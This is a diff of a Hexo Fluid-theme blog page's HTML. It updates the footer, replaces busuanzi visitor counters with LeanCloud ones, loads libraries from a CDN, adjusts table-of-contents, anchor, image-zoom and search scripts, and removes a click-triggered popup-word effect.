-<div class="col-lg-7 mx-auto nopadding-md">
-  <div class="container comments mx-auto" id="comments">
+      </div>
     
   </div>
 </div>
+
+<!-- Custom -->
+
 
     
   </main>
 
   
-    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
-      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
     </a>
   
 
@@ -441,92 +502,100 @@ itr()</code></pre>
 </div>
   
 
-  <footer class="mt-5">
-  <div class="text-center py-3">
-    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
-    <i class="iconfont icon-love"></i>
-    <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
-    <br>
-
-    
   
-    <!-- 不蒜子统计PV -->
-    
-    &nbsp;<span id="busuanzi_container_site_pv"></span>总访问量 
-          <span id="busuanzi_value_site_pv"></span> 次&nbsp;
-  
-  
-    <!-- 不蒜子统计UV -->
-    
-    &nbsp;<span id="busuanzi_container_site_uv"></span>总访客数 
-            <span id="busuanzi_value_site_uv"></span> 人&nbsp;
-  
-  <br>
 
-
-
-    
-
-
-    <!-- cnzz Analytics icon -->
-    
-
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
   </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- LeanCloud 统计PV -->
+        <span id="leancloud-site-pv-container" style="display: none">
+            总访问量 
+            <span id="leancloud-site-pv"></span>
+             次
+          </span>
+      
+      
+        <!-- LeanCloud 统计UV -->
+        <span id="leancloud-site-uv-container" style="display: none">
+            总访客数 
+            <span id="leancloud-site-uv"></span>
+             人
+          </span>
+      
+
+    
+  </div>
+
+
+  
+
+  
 </footer>
 
 <!-- SCRIPTS -->
-<script src="/lib/jquery/jquery.min.js" ></script>
-<script src="/lib/popper/popper.min.js" ></script>
-<script src="/lib/bootstrap/js/bootstrap.min.js" ></script>
-<script src="/lib/mdbootstrap/js/mdb.min.js" ></script>
-<script src="/js/main.js" ></script>
-
-
-  <script src="/js/lazyload.js" ></script>
-
-
-
-  
-    <script src="/lib/tocbot/tocbot.min.js" ></script>
-  
-  <script src="/js/post.js" ></script>
-
-
-
-  <script src="/lib/smoothscroll/SmoothScroll.min.js" ></script>
-
-
-
-  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
-
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
 
 <!-- Plugins -->
 
 
   
-
-  
-
-  
-
-  
-
-  <!-- cnzz Analytics -->
+    <script  src="/js/lazyload.js" ></script>
   
 
 
 
-  <script src="/lib/prettify/prettify.min.js" ></script>
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
   <script>
     $(document).ready(function () {
-      $('pre').addClass('prettyprint  linenums');
-      prettyPrint();
-    })
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
   </script>
 
 
 
-  <script src="/lib/typed/typed.min.js" ></script>
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
   <script>
     var typed = new Typed('#subtitle', {
       strings: [
@@ -546,11 +615,13 @@ itr()</code></pre>
 
 
 
-  <script src="/lib/anchor/anchor.min.js" ></script>
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
   <script>
     anchors.options = {
-      placement: "right",
-      visible: "false",
+      placement: "left",
+      visible: "hover",
+      
+      icon: "#"
       
     };
     var el = "h1,h2,h3,h4,h5,h6".split(",");
@@ -563,25 +634,27 @@ itr()</code></pre>
 
 
 
-  <script src="/js/local-search.js" ></script>
+  <script  src="/js/local-search.js" ></script>
   <script>
     var path = "/local-search.xml";
     var inputArea = document.querySelector("#local-search-input");
     inputArea.onclick = function () {
-      getSearchFile(path);
+      searchFunc(path, 'local-search-input', 'local-search-result');
       this.onclick = null
     }
   </script>
 
 
 
-  <script src="/lib/fancybox/jquery.fancybox.min.js" ></script>
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
   <script>
-    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
       function () {
-        var element = document.createElement("a");
-        $(element).attr("data-fancybox", "images");
-        $(element).attr("href", $(this).attr("src"));
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
         $(this).wrap(element);
       }
     );
@@ -591,58 +664,24 @@ itr()</code></pre>
 
 
 
-  
-  
-    <script type="text/javascript">
-      //定义获取词语下标
-      var a_idx = 0;
-      jQuery(document).ready(function ($) {
-        //点击body时触发事件
-        $("body").click(function (e) {
-          //需要显示的词语
-          var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正", "法治", "爱国", "敬业", "诚信", "友善");
-          //设置词语给span标签
-          var $i = $("<span/>").text(a[a_idx]);
-          //下标等于原来下标+1  余 词语总数
-          a_idx = (a_idx + 1) % a.length;
-          //获取鼠标指针的位置，分别相对于文档的左和右边缘。
-          //获取x和y的指针坐标
-          var x = e.pageX, y = e.pageY;
-          //在鼠标的指针的位置给$i定义的span标签添加css样式
-          $i.css({
-            "z-index": 999,
-            "top": y - 20,
-            "left": x,
-            "position": "absolute",
-            "font-weight": "bold",
-            "color": rand_color()
-          });
-          // 随机颜色
-          function rand_color() {
-            return "rgb(" + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + ")"
-          }
-          //在body添加这个标签
-          $("body").append($i);
-          //animate() 方法执行 CSS 属性集的自定义动画。
-          //该方法通过CSS样式将元素从一个状态改变为另一个状态。CSS属性值是逐渐改变的，这样就可以创建动画效果。
-          //详情请看http://www.w3school.com.cn/jquery/effect_animate.asp
-          $i.animate({
-            //将原来的位置向上移动180
-            "top": y - 180,
-            "opacity": 0
-            //1500动画的速度
-          }, 1500, function () {
-            //时间到了自动删除
-            $i.remove();
-          });
-        });
-      })
-      ;
-    </script>
-  
 
 
 
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
 
 
 
